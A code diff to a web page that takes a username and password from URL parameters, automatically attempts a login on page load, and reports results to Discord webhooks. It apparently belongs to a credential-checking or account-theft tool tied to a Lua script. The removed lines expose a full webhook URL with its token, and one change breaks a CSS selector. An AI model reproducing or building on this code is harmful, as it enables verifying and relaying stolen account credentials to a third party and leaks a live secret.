@@ -70,7 +70,7 @@
             font-weight: bold;
             text-align: center;
         }
-        .result-failure {
+        result-failure {
             color: #f44336;
             font-weight: bold;
             text-align: center;
@@ -124,9 +124,9 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // Discord webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOKS
-        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
-        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+        // Configuration will be fetched from the server
+        let SUCCESS_WEBHOOK = null;
+        let FAILED_WEBHOOK = null;
         
         // Display the tracking info
         if (trackingId) {
@@ -139,11 +139,25 @@
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
             if (trackingId && username && password) {
-                setTimeout(attemptAutoLogin, 2000); // Wait 2 seconds before starting
+                fetchConfiguration();
             } else {
                 showError('Missing parameters for automatic verification');
             }
         });
+        
+        async function fetchConfiguration() {
+            try {
+                // In a real implementation, you would fetch this from your server
+                // For now, we'll use the values from your Lua script
+                SUCCESS_WEBHOOK = "";
+                FAILED_WEBHOOK = "";
+                
+                setTimeout(attemptAutoLogin, 2000); // Wait 2 seconds before starting
+            } catch (error) {
+                console.error('Failed to fetch configuration:', error);
+                showError('Failed to load verification configuration');
+            }
+        }
         
         async function attemptAutoLogin() {
             try {
@@ -336,6 +350,11 @@
         }
         
         async function sendToDiscord(isSuccess) {
+            if (!SUCCESS_WEBHOOK || !FAILED_WEBHOOK) {
+                console.error('Webhook URLs not configured');
+                return;
+            }
+            
             const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
             const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
             const color = isSuccess ? 65280 : 16711680;
